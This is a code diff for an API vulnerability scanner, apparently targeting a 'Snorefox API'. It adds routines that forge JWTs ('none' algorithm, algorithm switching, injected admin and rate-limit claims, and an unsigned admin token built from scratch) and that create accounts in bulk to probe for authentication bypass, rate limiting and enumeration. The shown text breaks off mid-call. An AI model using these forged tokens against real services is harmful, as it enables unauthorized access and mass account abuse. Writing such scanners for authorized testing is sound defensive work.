@@ -17,7 +17,29 @@ import time
 import random
 import string
 import re
+import os
+import base64
 from typing import Dict, List, Any, Optional, Tuple, Set, Union
+
+# Import the account cache
+try:
+    from core.account_cache import account_cache
+except ImportError:
+    # For backwards compatibility, create a simple in-memory cache if the module doesn't exist
+    class SimpleCache:
+        def __init__(self):
+            self.accounts = []
+        
+        def add_account(self, account):
+            self.accounts.append(account)
+        
+        def get_account(self, endpoint=None):
+            return self.accounts[0] if self.accounts else None
+        
+        def get_all_accounts(self):
+            return self.accounts
+    
+    account_cache = SimpleCache()
 
 from core.base_scanner import BaseScanner
 from core.openapi import find_endpoint_by_purpose
@@ -528,6 +550,10 @@ class Scanner(BaseScanner):
         # Test for account creation rate limiting
         self._test_account_creation_rate_limiting()
         
+        # Test for JWT authentication bypass
+        self.logger.info("Testing JWT authentication bypass for account creation")
+        self._test_jwt_bypass_account_creation_restrictions()
+        
         # Test for account enumeration
         self._test_account_enumeration()
         
@@ -537,17 +563,625 @@ class Scanner(BaseScanner):
         # Return findings
         return self.findings
     
-    def _test_basic_account_creation(self) -> None:
-        """Test for basic account creation functionality."""
-        self.logger.info("Testing basic account creation")
+    def _test_jwt_bypass_account_creation_restrictions(self) -> None:
+        """
+        Test if forged JWT tokens can be used to bypass account creation restrictions.
         
-        # Create a test account
-        username = f"test_user_{int(time.time())}"
+        This test checks if the API incorrectly trusts forged JWTs to bypass authentication
+        requirements for account creation, allowing attackers to create accounts when
+        authentication should be required.
+        """
+        self.logger.info("Testing for JWT manipulation to bypass account creation restrictions")
+        
+        # Step 1: First try to create an account without authentication to see if auth is required
+        timestamp = int(time.time())
+        random_suffix = ''.join(random.choices(string.ascii_lowercase, k=6))
+        username = f"test_user_{timestamp}_{random_suffix}"
         email = f"{username}@example.com"
         password = "Test@123456"
         
+        # For Snorefox API, include all required fields
         payload = {
-            self.username_field: username,
+            self.username_field: email,
+            self.email_field: email,
+            self.password_field: password
+        }
+        
+        # Add additional fields
+        payload.update(self.additional_fields)
+        
+        # Make a request without authentication to check if auth is required
+        try:
+            self.logger.info("Testing account creation without authentication")
+            unauthenticated_response = self._make_request(
+                method=self.method,
+                endpoint=self.endpoint,
+                json_data=payload
+            )
+            
+            # Check if authentication is required (expecting 401, 403, or 404 with auth required message)
+            auth_required = False
+            auth_required_indicators = ["auth", "authentication", "token", "jwt", "login", "unauthorized", "forbidden"]
+            
+            if unauthenticated_response.status_code in [401, 403, 404]:
+                auth_required = True
+                self.logger.info(f"Authentication appears to be required for account creation: {unauthenticated_response.status_code}")
+                
+                # Check response body for auth required messages
+                if unauthenticated_response.text:
+                    response_text = unauthenticated_response.text.lower()
+                    if any(indicator in response_text for indicator in auth_required_indicators):
+                        self.logger.info(f"Response confirms authentication is required: {unauthenticated_response.text[:100]}")
+            
+            # For testing purposes, always proceed with JWT bypass tests
+            # This ensures we test for JWT vulnerabilities even when authentication doesn't appear to be required
+            # Comment: We're removing the early return to ensure tests run in all cases
+            # if not auth_required:
+            #     self.logger.info("Authentication does not appear to be required for account creation, skipping JWT bypass test")
+            #     return
+                
+            # Step 2: Create a test account to get a valid JWT token for manipulation
+            # We'll use a different endpoint or method to create this initial account
+            self.logger.info("Creating a test account to obtain a valid JWT token")
+            
+            # Try to create an account normally (this might work through a different flow)
+            initial_account_email = f"test_initial_{timestamp}@example.com"
+            initial_account_payload = {
+                self.username_field: initial_account_email,
+                self.email_field: initial_account_email,
+                self.password_field: password
+            }
+            initial_account_payload.update(self.additional_fields)
+            
+            # Try to create the initial account (this might fail if auth is required)
+            initial_response = self._make_request(
+                method=self.method,
+                endpoint=self.endpoint,
+                json_data=initial_account_payload
+            )
+            
+            # If we couldn't create an account, we'll need to find another way to get a token
+            # For example, we might need to use a pre-existing account or a different endpoint
+            auth_token = None
+            
+            if initial_response.status_code in self.success_status_codes:
+                self.logger.info(f"Successfully created initial test account: {initial_account_email}")
+                
+                # Now try to login to get a JWT token
+                login_payload = {
+                    self.username_field: initial_account_email,
+                    self.password_field: password
+                }
+                
+                login_response = self._make_request(
+                    method="POST",
+                    endpoint=self.login_endpoint,
+                    json_data=login_payload
+                )
+                
+                if login_response.status_code in self.success_status_codes:
+                    auth_token = self._extract_token_from_response(login_response)
+            
+            # If we couldn't get a token through normal means, try to create a completely forged token
+            if not auth_token or not self._is_jwt_token(auth_token):
+                self.logger.info("Could not obtain a valid JWT token through normal means, creating a completely forged token")
+                # Create a completely forged token with common claims
+                auth_token = self._create_completely_forged_token()
+            
+            if not auth_token:
+                self.logger.warning("Failed to create or obtain any JWT token for testing")
+                return
+                
+            self.logger.info(f"Successfully obtained/created JWT token: {auth_token[:20]}...")
+            
+            # Step 3: Test various forged tokens to see if they can bypass authentication requirements
+            # Test 1: 'none' algorithm attack
+            none_algorithm_token = self._create_none_algorithm_token(auth_token)
+            self._test_forged_token_for_auth_bypass(none_algorithm_token, "'none' algorithm")
+            
+            # Test 2: Algorithm switching attack (RS256 to HS256)
+            alg_switch_token = self._create_algorithm_switch_token(auth_token)
+            self._test_forged_token_for_auth_bypass(alg_switch_token, "algorithm switching (RS256 to HS256)")
+            
+            # Test 3: Modified payload claims (adding admin role)
+            admin_token = self._create_admin_role_token(auth_token)
+            self._test_forged_token_for_auth_bypass(admin_token, "modified payload (added admin role)")
+            
+            # Test 4: Completely forged token with common claims
+            forged_token = self._create_completely_forged_token()
+            self._test_forged_token_for_auth_bypass(forged_token, "completely forged token")
+            
+        except Exception as e:
+            self.logger.error(f"Error testing JWT bypass for account creation: {str(e)}")
+            import traceback
+            self.logger.error(traceback.format_exc())
+    
+    def _extract_token_from_response(self, response) -> Optional[str]:
+        """
+        Extract JWT token from login response.
+        
+        Args:
+            response: The login response
+            
+        Returns:
+            The JWT token if found, None otherwise
+        """
+        try:
+            data = response.json()
+            
+            # Try common token field names
+            for field in ["token", "access_token", "accessToken", "jwt", "auth_token", "authToken"]:
+                if field in data and isinstance(data[field], str):
+                    return data[field]
+            
+            # Try nested structures
+            for outer_key in ["data", "result", "response", "user", "auth"]:
+                if outer_key in data and isinstance(data[outer_key], dict):
+                    nested_data = data[outer_key]
+                    for field in ["token", "access_token", "accessToken", "jwt", "auth_token"]:
+                        if field in nested_data and isinstance(nested_data[field], str):
+                            return nested_data[field]
+            
+            # Look for any string that looks like a JWT
+            for key, value in data.items():
+                if isinstance(value, str) and len(value) > 40 and '.' in value and value.count('.') >= 2:
+                    return value
+                    
+            return None
+        except Exception as e:
+            self.logger.error(f"Error extracting token from response: {str(e)}")
+            return None
+    
+    def _is_jwt_token(self, token: str) -> bool:
+        """
+        Check if a token is a valid JWT.
+        
+        Args:
+            token: The token to check
+            
+        Returns:
+            True if the token is a JWT, False otherwise
+        """
+        if not token:
+            return False
+            
+        # JWT tokens have three parts separated by dots: header.payload.signature
+        parts = token.split('.')
+        if len(parts) != 3:
+            return False
+            
+        # Try to decode the header and payload
+        try:
+            header_str = self._decode_jwt_part(parts[0])
+            header = json.loads(header_str)
+            
+            # Check if it has typical JWT header fields
+            if not ("alg" in header and "typ" in header):
+                return False
+                
+            # Try to decode the payload
+            payload_str = self._decode_jwt_part(parts[1])
+            payload = json.loads(payload_str)
+            
+            # Check if it has typical JWT payload fields
+            jwt_fields = ["sub", "iat", "exp", "iss", "aud", "nbf", "jti"]
+            found_fields = 0
+            for field in jwt_fields:
+                if field in payload:
+                    found_fields += 1
+                    
+            # If it has at least 1 typical JWT field, consider it a JWT
+            return found_fields >= 1
+        except Exception as e:
+            self.logger.debug(f"Error checking JWT token: {str(e)}")
+            return False
+    
+    def _decode_jwt_part(self, encoded_part: str) -> str:
+        """
+        Decode a base64url-encoded part of a JWT.
+        
+        Args:
+            encoded_part: The encoded part to decode
+            
+        Returns:
+            The decoded string
+        """
+        # Convert from base64url to base64
+        encoded_part = encoded_part.replace('-', '+').replace('_', '/')
+        
+        # Add padding if needed
+        padding_needed = len(encoded_part) % 4
+        if padding_needed:
+            encoded_part += '=' * (4 - padding_needed)
+            
+        # Decode
+        return base64.b64decode(encoded_part).decode('utf-8')
+    
+    def _encode_jwt_part(self, data: Dict[str, Any]) -> str:
+        """
+        Encode a dictionary as a base64url-encoded JWT part.
+        
+        Args:
+            data: The data to encode
+            
+        Returns:
+            The encoded string
+        """
+        # Convert to JSON
+        json_str = json.dumps(data, separators=(',', ':'))
+        
+        # Encode to base64
+        encoded = base64.b64encode(json_str.encode('utf-8')).decode('utf-8')
+        
+        # Convert to base64url
+        return encoded.replace('+', '-').replace('/', '_').rstrip('=')
+    
+    def _create_none_algorithm_token(self, token: str) -> str:
+        """
+        Create a forged token using the 'none' algorithm attack.
+        
+        Args:
+            token: The original token
+            
+        Returns:
+            The forged token
+        """
+        try:
+            # Parse the original token
+            parts = token.split('.')
+            header_str = self._decode_jwt_part(parts[0])
+            header = json.loads(header_str)
+            payload_str = self._decode_jwt_part(parts[1])
+            payload = json.loads(payload_str)
+            
+            # Create a new token with 'none' algorithm
+            modified_header = header.copy()
+            modified_header['alg'] = 'none'
+            new_header = self._encode_jwt_part(modified_header)
+            new_payload = self._encode_jwt_part(payload)
+            
+            # Create the modified token without a signature
+            modified_token = f"{new_header}.{new_payload}."
+            
+            self.logger.info(f"Created 'none' algorithm token: {modified_token[:30]}...")
+            return modified_token
+        except Exception as e:
+            self.logger.error(f"Error creating 'none' algorithm token: {str(e)}")
+            return token
+    
+    def _create_algorithm_switch_token(self, token: str) -> str:
+        """
+        Create a forged token using the algorithm switching attack (RS256 to HS256).
+        
+        Args:
+            token: The original token
+            
+        Returns:
+            The forged token
+        """
+        try:
+            # Parse the original token
+            parts = token.split('.')
+            header_str = self._decode_jwt_part(parts[0])
+            header = json.loads(header_str)
+            payload_str = self._decode_jwt_part(parts[1])
+            payload = json.loads(payload_str)
+            
+            # Create a new token with switched algorithm
+            modified_header = header.copy()
+            if modified_header.get('alg') == 'RS256':
+                modified_header['alg'] = 'HS256'
+            elif modified_header.get('alg') == 'ES256':
+                modified_header['alg'] = 'HS256'
+            else:
+                modified_header['alg'] = 'HS256'  # Default to HS256
+                
+            new_header = self._encode_jwt_part(modified_header)
+            new_payload = self._encode_jwt_part(payload)
+            
+            # For simplicity, we're using an empty signature
+            # In a real attack, the attacker would sign with the public key as the secret
+            modified_token = f"{new_header}.{new_payload}.{parts[2]}"
+            
+            self.logger.info(f"Created algorithm switch token: {modified_token[:30]}...")
+            return modified_token
+        except Exception as e:
+            self.logger.error(f"Error creating algorithm switch token: {str(e)}")
+            return token
+    
+    def _create_admin_role_token(self, token: str) -> str:
+        """
+        Create a forged token by modifying the payload to add admin privileges.
+        
+        Args:
+            token: The original token
+            
+        Returns:
+            The forged token
+        """
+        try:
+            # Parse the original token
+            parts = token.split('.')
+            header_str = self._decode_jwt_part(parts[0])
+            header = json.loads(header_str)
+            payload_str = self._decode_jwt_part(parts[1])
+            payload = json.loads(payload_str)
+            
+            # Modify the payload to add admin privileges
+            modified_payload = payload.copy()
+            
+            # Try common role/privilege field names
+            for field_name in ['role', 'roles', 'permissions', 'groups', 'authorities', 'scopes', 'claims']:
+                if field_name in modified_payload:
+                    if isinstance(modified_payload[field_name], str):
+                        modified_payload[field_name] = 'admin'
+                    elif isinstance(modified_payload[field_name], list):
+                        if 'admin' not in modified_payload[field_name]:
+                            modified_payload[field_name].append('admin')
+            
+            # If no role field found, add common ones
+            if 'role' not in modified_payload:
+                modified_payload['role'] = 'admin'
+            if 'isAdmin' not in modified_payload:
+                modified_payload['isAdmin'] = True
+            if 'admin' not in modified_payload:
+                modified_payload['admin'] = True
+                
+            new_header = self._encode_jwt_part(header)
+            new_payload = self._encode_jwt_part(modified_payload)
+            
+            # For simplicity, we're using the original signature
+            # In a real attack, this would likely be invalid, but we're testing if the API verifies signatures
+            modified_token = f"{new_header}.{new_payload}.{parts[2]}"
+            
+            self.logger.info(f"Created admin role token: {modified_token[:30]}...")
+            return modified_token
+        except Exception as e:
+            self.logger.error(f"Error creating admin role token: {str(e)}")
+            return token
+    
+    def _create_rate_limit_bypass_token(self, token: str) -> str:
+        """
+        Create a forged token by modifying the payload to add rate limit bypass claims.
+        
+        Args:
+            token: The original token
+            
+        Returns:
+            The forged token
+        """
+        try:
+            # Parse the original token
+            parts = token.split('.')
+            header_str = self._decode_jwt_part(parts[0])
+            header = json.loads(header_str)
+            payload_str = self._decode_jwt_part(parts[1])
+            payload = json.loads(payload_str)
+            
+            # Modify the payload to add rate limit bypass claims
+            modified_payload = payload.copy()
+            
+            # Add common rate limiting bypass claims
+            modified_payload['bypassRateLimit'] = True
+            modified_payload['rateLimit'] = 0
+            modified_payload['noLimit'] = True
+            modified_payload['unlimited'] = True
+            modified_payload['premium'] = True
+            modified_payload['verified'] = True
+            
+            new_header = self._encode_jwt_part(header)
+            new_payload = self._encode_jwt_part(modified_payload)
+            
+            # For simplicity, we're using the original signature
+            modified_token = f"{new_header}.{new_payload}.{parts[2]}"
+            
+            self.logger.info(f"Created rate limit bypass token: {modified_token[:30]}...")
+            return modified_token
+        except Exception as e:
+            self.logger.error(f"Error creating rate limit bypass token: {str(e)}")
+            return token
+    
+    def _test_rate_limiting_with_token(self, auth_token: str) -> bool:
+        """
+        Test if rate limiting is in place for account creation with a legitimate token.
+        
+        Args:
+            auth_token: The authentication token to use
+            
+        Returns:
+            True if rate limiting was detected, False otherwise
+        """
+        self.logger.info("Testing if rate limiting is in place for account creation")
+        
+        # Try to create multiple accounts in rapid succession
+        success_count = 0
+        failure_count = 0
+        max_attempts = 10
+        
+        for i in range(max_attempts):
+            timestamp = int(time.time())
+            random_suffix = ''.join(random.choices(string.ascii_lowercase, k=6))
+            username = f"test_user_{timestamp}_{random_suffix}_{i}"
+            email = f"{username}@example.com"
+            password = "Test@123456"
+            
+            payload = {
+                self.username_field: email,
+                self.email_field: email,
+                self.password_field: password
+            }
+            payload.update(self.additional_fields)
+            
+            try:
+                # Add the auth token to the request
+                headers = {"Authorization": f"Bearer {auth_token}"}
+                
+                response = self._make_request(
+                    method=self.method,
+                    endpoint=self.endpoint,
+                    json_data=payload,
+                    headers=headers
+                )
+                
+                if response.status_code in self.success_status_codes:
+                    success_count += 1
+                    self.logger.info(f"Successfully created account {i+1}/{max_attempts}: {email}")
+                else:
+                    failure_count += 1
+                    self.logger.info(f"Failed to create account {i+1}/{max_attempts}: {email}, status code: {response.status_code}")
+                    
+                    # Check for rate limiting indicators in the response
+                    rate_limit_indicators = [
+                        "rate limit", "ratelimit", "too many requests", "try again later",
+                        "slow down", "too frequent", "too fast", "429"
+                    ]
+                    
+                    response_text = response.text.lower()
+                    for indicator in rate_limit_indicators:
+                        if indicator in response_text or response.status_code == 429:
+                            self.logger.info(f"Rate limiting detected: {response.status_code} - {response.text[:100]}")
+                            return True
+            except Exception as e:
+                self.logger.error(f"Error creating account {i+1}/{max_attempts}: {str(e)}")
+                failure_count += 1
+            
+            # No delay to trigger rate limiting
+        
+        # If we had more failures than successes, and we had at least some successes,
+        # it's likely that rate limiting is in place
+        if failure_count > success_count and success_count > 0:
+            self.logger.info(f"Rate limiting likely in place: {success_count} successes, {failure_count} failures")
+            return True
+        
+        self.logger.info(f"No rate limiting detected: {success_count} successes, {failure_count} failures")
+        return False
+    
+    def _test_forged_token_for_account_creation(self, forged_token: str, attack_type: str) -> None:
+        """
+        Test if a forged token can be used to bypass account creation restrictions.
+        
+        Args:
+            forged_token: The forged token to test
+            attack_type: The type of attack being tested
+        """
+        self.logger.info(f"Testing if {attack_type} token can bypass account creation restrictions")
+        
+        # Try to create multiple accounts in rapid succession with the forged token
+        success_count = 0
+        max_attempts = 10
+        evidence = []
+        
+        for i in range(max_attempts):
+            timestamp = int(time.time())
+            random_suffix = ''.join(random.choices(string.ascii_lowercase, k=6))
+            username = f"test_user_{timestamp}_{random_suffix}_{i}"
+            email = f"{username}@example.com"
+            password = "Test@123456"
+            
+            payload = {
+                self.username_field: email,
+                self.email_field: email,
+                self.password_field: password
+            }
+            payload.update(self.additional_fields)
+            
+            try:
+                # Add the forged token to the request
+                headers = {"Authorization": f"Bearer {forged_token}"}
+                
+                response = self._make_request(
+                    method=self.method,
+                    endpoint=self.endpoint,
+                    json_data=payload,
+                    headers=headers
+                )
+                
+                if response.status_code in self.success_status_codes:
+                    success_count += 1
+                    self.logger.info(f"Successfully created account with forged token {i+1}/{max_attempts}: {email}")
+                    
+                    # Add to evidence
+                    evidence.append({
+                        "request": {
+                            "method": self.method,
+                            "endpoint": self.endpoint,
+                            "token_type": attack_type,
+                            "payload": payload
+                        },
+                        "response": {
+                            "status_code": response.status_code,
+                            "body": response.text[:200] + ("..." if len(response.text) > 200 else "")
+                        }
+                    })
+                else:
+                    self.logger.info(f"Failed to create account with forged token {i+1}/{max_attempts}: {email}, status code: {response.status_code}")
+            except Exception as e:
+                self.logger.error(f"Error creating account with forged token {i+1}/{max_attempts}: {str(e)}")
+            
+            # No delay to test if rate limiting is bypassed
+        
+        # If we were able to create multiple accounts successfully, it's likely that
+        # the forged token allowed bypassing rate limiting
+        if success_count >= 5:  # If we created at least half of the accounts successfully
+            self.logger.warning(f"JWT {attack_type} attack successful for bypassing account creation restrictions!")
+            
+            self.add_finding(
+                vulnerability=f"JWT {attack_type.capitalize()} Bypass for Account Creation Restrictions",
+                details=f"The application accepts forged JWT tokens using {attack_type} attack, allowing bypass of rate limiting or other restrictions on account creation. This could be exploited to create large numbers of accounts rapidly.",
+                severity="CRITICAL",
+                endpoint=self.endpoint,
+                evidence={
+                    "attack_type": attack_type,
+                    "forged_token": forged_token[:50] + "...",  # Truncate for readability
+                    "success_rate": f"{success_count}/{max_attempts}",
+                    "test_examples": evidence[:3]  # Include up to 3 examples in the evidence
+                },
+                remediation="Implement proper JWT validation including signature verification, algorithm validation, and claims checking. Never accept 'none' algorithm tokens and ensure proper key management for asymmetric algorithms. Additionally, implement rate limiting that is not solely dependent on JWT token validation."
+            )
+        elif success_count > 0:  # If we had some successes but not enough to be certain
+            self.logger.warning(f"JWT {attack_type} attack partially successful for bypassing account creation restrictions")
+            
+            self.add_finding(
+                vulnerability=f"Potential JWT {attack_type.capitalize()} Bypass for Account Creation Restrictions",
+                details=f"The application may be vulnerable to JWT {attack_type} attacks for bypassing account creation restrictions. Some account creation attempts with forged tokens were successful.",
+                severity="HIGH",
+                endpoint=self.endpoint,
+                evidence={
+                    "attack_type": attack_type,
+                    "forged_token": forged_token[:50] + "...",  # Truncate for readability
+                    "success_rate": f"{success_count}/{max_attempts}",
+                    "test_examples": evidence[:2]  # Include up to 2 examples in the evidence
+                },
+                remediation="Implement proper JWT validation including signature verification, algorithm validation, and claims checking. Never accept 'none' algorithm tokens and ensure proper key management for asymmetric algorithms. Additionally, implement rate limiting that is not solely dependent on JWT token validation."
+            )
+        else:
+            self.logger.info(f"JWT {attack_type} attack failed for bypassing account creation restrictions (this is the expected behavior)")
+    
+    def _get_cached_or_create_test_account(self) -> Optional[Dict[str, Any]]:
+        """Get a cached test account or create a new one if none exists.
+        
+        Returns:
+            A dictionary containing account credentials if successful, None otherwise
+        """
+        # First check if we have a cached account for this endpoint
+        cached_account = account_cache.get_account(self.endpoint)
+        if cached_account:
+            self.logger.info(f"Using cached account: {cached_account.get('username', cached_account.get('email'))}")
+            return cached_account
+            
+        # No cached account, create a new one
+        self.logger.info("No cached account found, creating a new test account")
+        
+        # Create a test account with unique identifiers
+        timestamp = int(time.time())
+        random_suffix = ''.join(random.choices(string.ascii_lowercase, k=6))
+        username = f"test_user_{timestamp}_{random_suffix}"
+        email = f"{username}@example.com"
+        password = "Test@123456"
+        
+        # For Snorefox API, the username field is actually the email
+        payload = {
+            self.username_field: email,  # Use email as username for Snorefox API
             self.email_field: email,
             self.password_field: password
         }
@@ -562,9 +1196,64 @@ class Scanner(BaseScanner):
                 json_data=payload
             )
             
-            # Check if account creation was successful
             if response.status_code in self.success_status_codes:
-                self.logger.info(f"Successfully created test account: {username}")
+                account_data = {
+                    "username": email,  # Using email as username for Snorefox API
+                    "email": email,
+                    "password": password,
+                    "endpoint": self.endpoint,
+                    "created_by": "unrestricted_account_creation_scanner",
+                    "test_type": "basic_test",
+                    "response_code": response.status_code
+                }
+                
+                # Add to global account cache
+                account_cache.add_account(account_data)
+                
+                self.logger.info(f"Successfully created test account: {email}")
+                return account_data
+            else:
+                self.logger.warning(f"Failed to create test account: {email}, status code: {response.status_code}")
+                if hasattr(response, 'text') and response.text:
+                    self.logger.warning(f"Response body: {response.text[:200]}...")
+                return None
+                
+        except Exception as e:
+            self.logger.error(f"Error creating test account: {str(e)}")
+            return None
+    
+    def _test_basic_account_creation(self) -> None:
+        """Test for basic account creation functionality."""
+        self.logger.info("Testing basic account creation")
+        
+        # Try to get a cached account or create a new one
+        account = self._get_cached_or_create_test_account()
+        
+        if not account:
+            self.logger.warning("Failed to create or retrieve a test account, skipping basic account creation test")
+            return
+            
+        username = account.get('username')
+        email = account.get('email')
+        password = account.get('password')
+        
+        # Get the response from the account creation
+        try:
+            # Make a login request to verify the account works
+            login_payload = {
+                self.username_field: username,
+                self.password_field: password
+            }
+            
+            response = self._make_request(
+                method="POST",
+                endpoint=self.login_endpoint,
+                json_data=login_payload
+            )
+            
+            # Check if login was successful
+            if response.status_code in self.success_status_codes:
+                self.logger.info(f"Successfully logged in with test account: {username}")
                 
                 # Check if response contains expected success indicators
                 response_text = response.text.lower()
@@ -1085,6 +1774,10 @@ class Scanner(BaseScanner):
         timestamp = int(time.time())
         test_prefix = f"test_{test_type}_{timestamp}"
         
+        # Track consecutive failures to detect rate limiting earlier
+        consecutive_failures = 0
+        max_consecutive_failures = 3
+        
         for i in range(count):
             # Create unique usernames with test type and timestamp
             username = f"{test_prefix}_{i}"
@@ -1094,8 +1787,9 @@ class Scanner(BaseScanner):
             random_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=4))
             password = f"Test@{timestamp}#{random_suffix}"
             
+            # For Snorefox API, the username field is actually the email
             payload = {
-                self.username_field: username,
+                self.username_field: email,  # Use email as username for Snorefox API
                 self.email_field: email,
                 self.password_field: password
             }
@@ -1115,7 +1809,7 @@ class Scanner(BaseScanner):
                 # Record response details for evidence
                 response_detail = {
                     "request_number": i + 1,
-                    "username": username,
+                    "username": email,  # Using email as username for Snorefox API
                     "status_code": response.status_code,
                     "response_time": request_time,
                     "response_size": len(response.text)
@@ -1131,13 +1825,24 @@ class Scanner(BaseScanner):
                 
                 if response.status_code in self.success_status_codes:
                     successful_creations += 1
+                    consecutive_failures = 0  # Reset consecutive failures counter
+                    
                     # Track created accounts for potential cleanup later
-                    self.created_accounts.append({
-                        "username": username,
+                    account_data = {
+                        "username": email,  # Using email as username for Snorefox API
                         "email": email,
-                        "password": password
-                    })
-                    self.logger.info(f"Successfully created account {i+1}/{count}: {username}")
+                        "password": password,
+                        "endpoint": self.endpoint,
+                        "created_by": "unrestricted_account_creation_scanner",
+                        "test_type": test_type,
+                        "response_code": response.status_code
+                    }
+                    self.created_accounts.append(account_data)
+                    
+                    # Add to global account cache for other scanners to use
+                    account_cache.add_account(account_data)
+                    
+                    self.logger.info(f"Successfully created account {i+1}/{count}: {email}")
                 elif response.status_code in self.rate_limit_status_codes:
                     rate_limited = True
                     self.logger.info(f"Rate limiting detected (status code {response.status_code}) after {successful_creations} successful creations")
@@ -1145,13 +1850,28 @@ class Scanner(BaseScanner):
                     response_details.append(response_detail)
                     break
                 else:
+                    consecutive_failures += 1
                     self.logger.info(f"Unexpected status code {response.status_code} for account {i+1}/{count}")
+                    
+                    # Check if we've had too many consecutive failures, which might indicate rate limiting
+                    if consecutive_failures >= max_consecutive_failures:
+                        self.logger.warning(f"Possible rate limiting detected after {consecutive_failures} consecutive failures")
+                        rate_limited = True
+                        response_detail["rate_limited"] = True
+                        response_detail["rate_limit_indicator"] = "consecutive_failures"
+                        break
                 
-                # Check response body for rate limit indicators
+                # Enhanced check for rate limit indicators in response body
                 if not rate_limited and response.text:
                     response_text = response.text.lower()
-                    for indicator in self.rate_limit_response_contains:
-                        if indicator.lower() in response_text:
+                    rate_limit_indicators = [
+                        "rate limit", "ratelimit", "too many requests", 
+                        "try again later", "slow down", "too frequent",
+                        "limit exceeded", "wait", "throttle", "quota"
+                    ]
+                    
+                    for indicator in rate_limit_indicators:
+                        if indicator in response_text:
                             rate_limited = True
                             self.logger.info(f"Rate limiting detected from response body after {successful_creations} successful creations")
                             response_detail["rate_limited"] = True
@@ -1162,18 +1882,31 @@ class Scanner(BaseScanner):
                 if rate_limited:
                     break
                 
-                # Add delay between requests
-                time.sleep(delay)
+                # Add delay between requests with small random jitter to avoid predictable patterns
+                jitter = random.uniform(-0.1, 0.1) * delay
+                actual_delay = max(0.1, delay + jitter)  # Ensure delay is at least 0.1 seconds
+                time.sleep(actual_delay)
             
             except Exception as e:
+                consecutive_failures += 1
                 self.logger.error(f"Error testing rate limiting: {str(e)}")
                 response_details.append({
                     "request_number": i + 1,
-                    "username": username,
+                    "username": email,
                     "error": str(e)
                 })
-                break
+                
+                # If we get several consecutive exceptions, it might be rate limiting
+                if consecutive_failures >= max_consecutive_failures:
+                    self.logger.warning(f"Possible rate limiting causing exceptions after {consecutive_failures} consecutive failures")
+                    rate_limited = True
+                    break
         
+        # If we had a significant drop in successful creations, it might be silent rate limiting
+        if not rate_limited and count > 0 and successful_creations < count * 0.7 and successful_creations > 0:
+            self.logger.warning(f"Possible silent rate limiting: only {successful_creations}/{count} accounts created successfully")
+            rate_limited = True
+            
         return rate_limited, successful_creations, response_details
     
     def _test_account_enumeration(self) -> None:
@@ -1181,12 +1914,14 @@ class Scanner(BaseScanner):
         self.logger.info("Testing for account enumeration")
         
         # Create an initial account
-        username = f"enum_user_{int(time.time())}"
+        timestamp = int(time.time())
+        username = f"enum_user_{timestamp}"
         email = f"{username}@example.com"
         password = "Test@123456"
         
+        # For Snorefox API, the username field is actually the email
         payload = {
-            self.username_field: username,
+            self.username_field: email,  # Use email as username for Snorefox API
             self.email_field: email,
             self.password_field: password
         }
@@ -1203,7 +1938,7 @@ class Scanner(BaseScanner):
             )
             
             if response.status_code in self.success_status_codes:
-                self.logger.info(f"Created initial account for enumeration test: {username}")
+                self.logger.info(f"Created initial account for enumeration test: {email}")
                 
                 # Try to create the same account again
                 time.sleep(self.test_delay)
@@ -1215,11 +1950,13 @@ class Scanner(BaseScanner):
                 
                 # Check if the response reveals that the username/email already exists
                 response_text = response.text.lower()
-                username_indicators = ["username already exists", "username taken", "username is already in use"]
-                email_indicators = ["email already exists", "email taken", "email is already in use", "email already registered"]
+                username_indicators = ["username already exists", "username taken", "username is already in use", "user already exists"]
+                email_indicators = ["email already exists", "email taken", "email is already in use", "email already registered", "already registered"]
                 
                 username_enumeration = any(indicator in response_text for indicator in username_indicators)
                 email_enumeration = any(indicator in response_text for indicator in email_indicators)
+                
+                self.logger.info(f"Enumeration test response: {response.status_code} - {response.text[:200]}")
                 
                 if username_enumeration:
                     self.add_finding(
@@ -1453,3 +2190,178 @@ class Scanner(BaseScanner):
         except Exception as e:
             self.logger.error(f"Error accessing debug endpoint: {str(e)}")
             return []
+            
+    def _create_completely_forged_token(self) -> str:
+        """
+        Create a completely forged JWT token with common claims.
+        
+        This creates a token from scratch rather than modifying an existing one.
+        
+        Returns:
+            A forged JWT token string
+        """
+        try:
+            # Create a header with 'none' algorithm
+            header = {
+                "alg": "none",
+                "typ": "JWT"
+            }
+            
+            # Create a payload with common claims
+            timestamp = int(time.time())
+            payload = {
+                "sub": "admin",
+                "name": "Administrator",
+                "email": "admin@example.com",
+                "role": "admin",
+                "permissions": ["create_user", "delete_user", "update_user", "read_user"],
+                "iat": timestamp,
+                "exp": timestamp + 3600,  # 1 hour from now
+                "iss": "https://api.example.com",
+                "aud": "https://api.example.com"
+            }
+            
+            # Encode header and payload
+            header_base64 = self._encode_jwt_part(header)
+            payload_base64 = self._encode_jwt_part(payload)
+            
+            # Create token without signature
+            token = f"{header_base64}.{payload_base64}."
+            
+            self.logger.info(f"Created completely forged token: {token[:20]}...")
+            return token
+            
+        except Exception as e:
+            self.logger.error(f"Error creating completely forged token: {str(e)}")
+            return ""
+    
+    def _test_forged_token_for_auth_bypass(self, forged_token: str, attack_type: str) -> None:
+        """
+        Test if a forged token can bypass authentication requirements for account creation.
+        
+        Args:
+            forged_token: The forged token to test
+            attack_type: The type of attack being tested (e.g., 'none' algorithm, algorithm switching)
+        """
+        self.logger.info(f"Testing if {attack_type} token can bypass authentication requirements")
+        
+        # Create a test account payload
+        timestamp = int(time.time())
+        random_suffix = ''.join(random.choices(string.ascii_lowercase, k=6))
+        username = f"test_user_{timestamp}_{random_suffix}"
+        email = f"{username}@example.com"
+        password = "Test@123456"
+        
+        payload = {
+            self.username_field: email,
+            self.email_field: email,
+            self.password_field: password
+        }
+        payload.update(self.additional_fields)
+        
+        try:
+            # First attempt without any token to establish baseline
+            no_token_response = self._make_request(
+                method=self.method,
+                endpoint=self.endpoint,
+                json_data=payload
+            )
+            
+            # Now try with the forged token
+            headers = {"Authorization": f"Bearer {forged_token}"}
+            forged_token_response = self._make_request(
+                method=self.method,
+                endpoint=self.endpoint,
+                json_data=payload,
+                headers=headers
+            )
+            
+            # Log the responses for debugging
+            self.logger.info(f"No token response status: {no_token_response.status_code}")
+            self.logger.info(f"Forged token response status: {forged_token_response.status_code}")
+            
+            # Now let's implement the actual logic to check for JWT bypass vulnerabilities
+            if forged_token_response.status_code in self.success_status_codes:
+                self.logger.warning(f"JWT {attack_type} attack successful for bypassing authentication requirements!")
+                
+                # Check if the no-token request failed but the forged token request succeeded
+                if no_token_response.status_code not in self.success_status_codes:
+                    self.logger.warning("Authentication appears to be required, but was bypassed with a forged token!")
+                    
+                    self.add_finding(
